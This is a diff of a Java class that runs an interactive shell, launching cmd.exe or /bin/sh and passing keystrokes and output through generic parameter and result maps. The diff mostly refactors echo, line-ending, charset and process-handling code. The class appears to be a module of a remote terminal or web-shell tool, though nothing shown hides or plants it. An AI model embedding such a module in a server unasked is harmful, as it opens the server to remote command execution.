-                    // 退格：回退一格、覆盖空格、再回退
-                    outputStream.write('\b');
-                    outputStream.write(' ');
-                    outputStream.write('\b');
-                } else if (b >= 32) {
-                    // 可打印字符正常回显
-                    outputStream.write(b);
+        ByteArrayOutputStream output = (ByteArrayOutputStream) processMap.get("output");
+        if (output == null) return;
+        synchronized (output) {
+            int index;
+            for (index = 0; index < command.length; index++) {
+                byte value = command[index];
+                if (value == '\r' || value == '\n') {
+                    output.write('\r'); output.write('\n');
+                    if (value == '\r' && index + 1 < command.length && command[index + 1] == '\n') index++;
+                } else if (value == '\b' || value == 127) {
+                    output.write('\b'); output.write(' '); output.write('\b');
+                } else if (value >= 32) {
+                    output.write(value);
                 }
-                // 其他控制字符（\x01-\x1f 除上述外）不回显
             }
         }
     }
 
-    /**
-     * 将字节数组中孤立的 \r 转换为 \r\n（Windows cmd.exe 管道输入需要）。
-     * 已有的 \r\n 保持不变。
-     */
     private byte[] convertCrForWindows(byte[] input) {
-        // 先计算需要插入多少个 \n
-        int extraCount = 0;
-        for (int i = 0; i < input.length; i++) {
-            if (input[i] == '\r') {
-                if (i + 1 >= input.length || input[i + 1] != '\n') {
-                    extraCount++;
-                }
-            }
+        int extra = 0;
+        int index;
+        for (index = 0; index < input.length; index++) {
+            if (input[index] == '\r' && (index + 1 >= input.length || input[index + 1] != '\n')) extra++;
         }
-        if (extraCount == 0) {
-            return input;
-        }
-
-        byte[] result = new byte[input.length + extraCount];
-        int pos = 0;
-        for (int i = 0; i < input.length; i++) {
-            result[pos++] = input[i];
-            if (input[i] == '\r') {
-                if (i + 1 >= input.length || input[i + 1] != '\n') {
-                    result[pos++] = '\n';
-                }
+        if (extra == 0) return input;
+        byte[] result = new byte[input.length + extra];
+        int target = 0;
+        for (index = 0; index < input.length; index++) {
+            result[target++] = input[index];
+            if (input[index] == '\r' && (index + 1 >= input.length || input[index + 1] != '\n')) {
+                result[target++] = '\n';
             }
         }
         return result;
     }
 
-    private void readOutput(Map processMap) throws IOException {
-        ByteArrayOutputStream outputStream = (ByteArrayOutputStream) processMap.get("output");
-
-        if (outputStream != null) {
-            // 【修复 #2】synchronized 保护 toByteArray + reset 原子性
-            byte[] outputData;
-            synchronized (outputStream) {
-                outputData = outputStream.toByteArray();
-                outputStream.reset();
-            }
-            results.put("data", outputData);
-        } else {
-            results.put("data", new byte[0]);
-        }
-
-        // 【修复 #3】返回进程存活状态和退出码
-        Process process = (Process) processMap.get("process");
-        if (process != null) {
-            try {
-                int exitCode = process.exitValue(); // 不阻塞，进程未退出会抛 IllegalThreadStateException
-                results.put("alive", Boolean.FALSE);
-                results.put("exitCode", Integer.valueOf(exitCode));
-            } catch (IllegalThreadStateException e) {
-                results.put("alive", Boolean.TRUE);
-            }
-        } else {
-            // process 还未设置（进程启动中）
-            results.put("alive", Boolean.TRUE);
-            results.put("starting", Boolean.TRUE);
-        }
-
-        // 【修复 #5】如果标记了 exited 且 process 也为空，说明启动失败
-        if (Boolean.TRUE.equals(processMap.get("exited")) && process == null) {
-            results.put("alive", Boolean.FALSE);
-            Object error = processMap.get("error");
-            results.put("error", error != null ? error : "process failed to start");
-        }
-    }
-
-    private void destroyProcess(String processId, Map processMap) {
-        // 【修复 #7】显式关闭 stdin 流
-        OutputStream stdin = (OutputStream) processMap.get("stdin");
-        if (stdin != null) {
-            try {
-                stdin.close();
-            } catch (Exception ignored) {
-            }
-        }
-
-        Process process = (Process) processMap.get("process");
-        if (process != null) {
-            process.destroy();
-        }
-
-        env.remove(processId);
-    }
-
-    private ProcessBuilder createProcessBuilder() {
-        String[] command;
-        if (isWindows()) {
-            // /Q 禁用 cmd 自身的命令回显，由 echoForWindows 提供实时回显
-            command = new String[]{WINDOWS_CMD, "/Q"};
-        } else {
-            command = new String[]{"/bin/sh", "-c", UNIX_PTY_SCRIPT};
-        }
-        return new ProcessBuilder(command);
+    private String detectCharset() {
+        if (!isWindows()) return "UTF-8";
+        String charset = System.getProperty("sun.jnu.encoding");
+        if (charset == null || charset.length() == 0) charset = System.getProperty("file.encoding");
+        return charset != null && charset.length() > 0 ? charset : "GBK";
     }
 
     private boolean isWindows() {
-        return System.getProperty("os.name", "").toLowerCase().contains("windows");
+        return System.getProperty("os.name", "").toLowerCase().indexOf("windows") >= 0;
     }
 
-    /**
-     * 【修复 #6】动态检测控制台编码，而非硬编码 GBK
-     * 优先 sun.jnu.encoding（JVM 原生编码），其次 file.encoding，最后 fallback
-     */
-    private String detectCharset() {
-        if (!isWindows()) {
-            return "UTF-8";
+    private static String createInstanceId() {
+        try {
+            java.lang.management.RuntimeMXBean runtime = java.lang.management.ManagementFactory.getRuntimeMXBean();
+            String value = runtime.getName() + "|" + runtime.getStartTime();
+            return Long.toHexString(runtime.getStartTime()) + "-" + Integer.toHexString(value.hashCode());
+        } catch (Throwable ignored) {
+            String value = System.getProperty("java.vm.name", "java") + "|"
+                    + System.getProperty("user.dir", "") + "|" + System.currentTimeMillis();
+            return Integer.toHexString(value.hashCode());
         }
-        String charset = System.getProperty("sun.jnu.encoding");
-        if (charset != null && charset.length() > 0) {
-            return charset;
-        }
-        charset = System.getProperty("file.encoding");
-        if (charset != null && charset.length() > 0) {
-            return charset;
-        }
-        return "GBK"; // Windows 中文 fallback
     }
 
     private String getStringParam(String key) {
-        if (key == null) {
-            return null;
-        }
         Object value = params.get(key);
-        if (value == null) {
-            return null;
-        }
-        if (value instanceof String) {
-            return (String) value;
-        }
+        if (value == null) return null;
+        if (value instanceof String) return (String) value;
         try {
             return new String((byte[]) value, "UTF-8");
-        } catch (UnsupportedEncodingException e) {
-            throw new RuntimeException(e);
+        } catch (UnsupportedEncodingException error) {
+            throw new RuntimeException(error);
+        }
+    }
+
+    private byte[] getBytesParam(String key) {
+        Object value = params.get(key);
+        if (value instanceof byte[]) return (byte[]) value;
+        try {
+            return value == null ? new byte[0] : String.valueOf(value).getBytes("UTF-8");
+        } catch (UnsupportedEncodingException error) {
+            throw new RuntimeException(error);
         }
     }
 }
